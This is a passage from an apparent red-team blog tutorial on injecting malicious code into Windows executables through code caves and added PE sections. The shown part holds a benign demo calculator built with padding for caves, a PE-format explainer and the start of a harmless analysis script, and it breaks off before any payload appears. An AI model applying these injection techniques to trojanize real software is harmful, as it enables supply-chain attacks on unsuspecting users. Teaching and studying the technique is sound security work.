<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Binary Injection in Windows Applications" /><meta property="og:locale" content="en" /><meta name="description" content="Demonstrating binary injection using code cave and section addition methods." /><meta property="og:description" content="Demonstrating binary injection using code cave and section addition methods." /><link rel="canonical" href="https://blog.nairpaa.me/posts/binary-injection-in-windows-app/" /><meta property="og:url" content="https://blog.nairpaa.me/posts/binary-injection-in-windows-app/" /><meta property="og:site_name" content="Nairpaa" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2026-01-11T15:12:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Binary Injection in Windows Applications" /><meta name="twitter:site" content="@nairpaa" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-11T15:12:00+07:00","datePublished":"2026-01-11T15:12:00+07:00","description":"Demonstrating binary injection using code cave and section addition methods.","headline":"Binary Injection in Windows Applications","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.nairpaa.me/posts/binary-injection-in-windows-app/"},"url":"https://blog.nairpaa.me/posts/binary-injection-in-windows-app/"}</script><title>Binary Injection in Windows Applications | Nairpaa</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://cloud.umami.is/script.js" data-website-id="6ef0c212-fcb3-466a-882c-946fe3ef0300" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Nairpaa</a><p class="site-subtitle fst-italic mb-0">Wannabe Red Teamer</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/nairpaa" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nairpaa" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/nairpaa" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['muhammad','nairpaa.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Binary Injection in Windows Applications</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Binary Injection in Windows Applications</h1><p class="post-desc fw-light mb-4">Demonstrating binary injection using code cave and section addition methods.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1768119120" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 11, 2026 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://www.linkedin.com/in/nairpaa">Nairpaa</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="6110 words" > <em>33 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Binary Injection in Windows Applications</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Binary Injection in Windows Applications</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Binary injection is a technique that hides malicious code inside legitimate executables. This article demonstrates two injection methods:</p><ol><li><strong>Code cave injection</strong> - Injecting code into existing empty space within executables<li><strong>Section addition</strong> - Creating new executable sections to hold malicious payloads</ol><p>We’ll use a custom Calculator application to show how these attacks work in practice.</p><blockquote class="prompt-warning"><p><strong>Disclaimer:</strong> This content is for educational purposes only. Use these techniques responsibly and only on systems you own or have explicit permission to test.</p></blockquote><h2 id="why-binary-injection-matters"><span class="me-2">Why Binary Injection Matters</span><a href="#why-binary-injection-matters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In our <a href="/posts/code-signing-in-windows-app/">previous article on code signing</a>, we demonstrated basic binary modification by patching text strings. This article explores advanced modification techniques through binary injection.</p><p>Binary injection enables:</p><ul><li><strong>Supply chain attacks</strong> - Compromised installers containing hidden malware<li><strong>Trojanized applications</strong> - Legitimate programs repackaged with backdoors<li><strong>Persistence mechanisms</strong> - Modified system utilities maintaining access<li><strong>Privilege escalation</strong> - Injected code inheriting application permissions</ul><p>Understanding these techniques is critical for security professionals in both offensive testing and defensive analysis.</p><p>According to <a href="https://owasp.org/www-project-desktop-app-security-top-10/">OWASP Desktop App Security Top 10</a>, lack of integrity verification (<strong>DA8 - Poor Code Quality</strong>) enables these attacks.</p><h2 id="test-application-setup"><span class="me-2">Test Application Setup</span><a href="#test-application-setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We’ll use a custom Calculator application for this demonstration:</p><div file="Calculator.cpp" class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Calculator.cpp"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="c1">// IMPORTANT: These dummy functions create empty space (padding) in the compiled program.</span>
<span class="c1">// We call them to prevent compiler optimization from removing them.</span>
<span class="c1">// This padding creates "code caves" which we'll use for injection in Part 2.</span>
<span class="c1">// Don't worry about understanding this now - we'll explain why this matters later!</span>
<span class="kt">void</span> <span class="nf">dummy1</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">dummy2</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">dummy3</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">dummy4</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">dummy5</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>

<span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">subtract</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">multiply</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">divide</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> 
    <span class="k">if</span><span class="p">(</span><span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Error: Division by zero!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span><span class="p">;</span> 
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">printMenu</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">=================================</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"       Simple Calculator</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"=================================</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"1. Add</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"2. Subtract</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"3. Multiply</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"4. Divide</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"5. Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"=================================</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// Call dummy functions to create padding</span>
    <span class="c1">// (We'll explain why this is important in Part 2)</span>
    <span class="n">dummy1</span><span class="p">();</span> <span class="n">dummy2</span><span class="p">();</span> <span class="n">dummy3</span><span class="p">();</span> <span class="n">dummy4</span><span class="p">();</span> <span class="n">dummy5</span><span class="p">();</span>
    
    <span class="kt">int</span> <span class="n">choice</span><span class="p">,</span> <span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">;</span>
    
    <span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printMenu</span><span class="p">();</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Enter choice (1-5): "</span><span class="p">;</span>
        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">choice</span><span class="p">;</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">choice</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Goodbye!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">choice</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Invalid choice!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Enter first number: "</span><span class="p">;</span>
        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">num1</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Enter second number: "</span><span class="p">;</span>
        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">num2</span><span class="p">;</span>
        
        <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Result: "</span> <span class="o">&lt;&lt;</span> <span class="n">add</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Result: "</span> <span class="o">&lt;&lt;</span> <span class="n">subtract</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Result: "</span> <span class="o">&lt;&lt;</span> <span class="n">multiply</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
                <span class="k">if</span><span class="p">(</span><span class="n">num2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
                    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Result: "</span> <span class="o">&lt;&lt;</span> <span class="n">divide</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Build it as x64 Release in Visual Studio.</p><p>The executable will be at <code class="language-plaintext highlighter-rouge">x64\Release\Calculator.exe</code>.</p><p><a href="/assets/img/posts/binary-injection-in-windows-app/calculator-running.png" class="popup img-link shimmer"><img src="/assets/img/posts/binary-injection-in-windows-app/calculator-running.png" alt="Calculator running" loading="lazy"></a> <em>Calculator application running</em></p><h2 id="demonstration-code-cave-method"><span class="me-2">Demonstration: Code Cave Method</span><a href="#demonstration-code-cave-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="understanding-pe-files"><span class="me-2">Understanding PE Files</span><a href="#understanding-pe-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="what-is-a-pe-file"><span class="me-2">What is a PE File?</span><a href="#what-is-a-pe-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>PE stands for <strong>Portable Executable</strong> - the format Windows uses for programs:</p><ul><li><code class="language-plaintext highlighter-rouge">.exe</code> files (applications like our Calculator.exe)<li><code class="language-plaintext highlighter-rouge">.dll</code> files (libraries)<li><code class="language-plaintext highlighter-rouge">.sys</code> files (drivers)</ul><p>Think of a PE file like a <strong>cookbook</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>Cookbook (PE File)
│
├── Cover Page (DOS Header)
│   └── Says "This is a cookbook" (file signature)
│
├── Table of Contents (PE Headers)
│   ├── Author information
│   ├── Publication date
│   └── Start reading at page 5 ← This is the "Entry Point"
│
├── Index (Section Table)
│   ├── Chapter 1: Recipes (pages 5-20) ← Code Section
│   ├── Chapter 2: Ingredients List (pages 21-25) ← Data Section
│   └── Chapter 3: Photos (pages 26-30) ← Resources
│
└── Content (Sections)
    ├── Chapter 1: Step-by-step cooking instructions
    ├── Chapter 2: List of ingredients needed
    └── Chapter 3: Pictures of finished dishes
</pre></table></code></div></div><p><strong>Key Concepts:</strong></p><ol><li><strong>Entry Point</strong> - Where the program starts (like “start reading at page 5”)<li><strong>Sections</strong> - Different parts of the program (like chapters)<li><strong>Code Section</strong> (<code class="language-plaintext highlighter-rouge">.text</code>) - The actual instructions the computer follows<li><strong>Data Section</strong> (<code class="language-plaintext highlighter-rouge">.rdata</code>, <code class="language-plaintext highlighter-rouge">.data</code>) - Information the program uses (text, numbers, etc.)</ol><h4 id="analyzing-our-calculatorexe"><span class="me-2">Analyzing Our Calculator.exe</span><a href="#analyzing-our-calculatorexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s examine our Calculator program using Python. First, we need to understand what we’re looking for.</p><p>When we analyze a PE file, we want to know:</p><ul><li>Where does the program start? (Entry Point)<li>What sections does it have?<li>Which sections contain executable code?</ul><p>Here’s our analysis script:</p><div file="analyze_pe.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="analyze_pe.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># ANSI Color codes for terminal output
</span><span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>    <span class="c1"># Magenta
</span>    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>      <span class="c1"># Blue
</span>    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>      <span class="c1"># Cyan
</span>    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>     <span class="c1"># Green
</span>    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>    <span class="c1"># Yellow
</span>    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>       <span class="c1"># Red
</span>    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>       <span class="c1"># Bold
</span>    <span class="n">UNDERLINE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[4m</span><span class="sh">'</span>  <span class="c1"># Underline
</span>    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>        <span class="c1"># Reset
</span>
<span class="k">def</span> <span class="nf">analyze_pe</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Analyze PE file structure - shows what</span><span class="sh">'</span><span class="s">s inside an executable</span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== Analyzing: </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s"> ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># 1. Entry Point - where the program begins
</span>    <span class="n">entry_point</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[1] Entry Point:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">entry_point</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    This is where the program starts executing</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Like the cookbook saying </span><span class="sh">'</span><span class="s">start reading at page 5</span><span class="sh">'</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># 2. Sections - the different chapters
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[2] Sections (Chapters):</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Total sections: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
        <span class="c1"># Get section name (remove null padding)
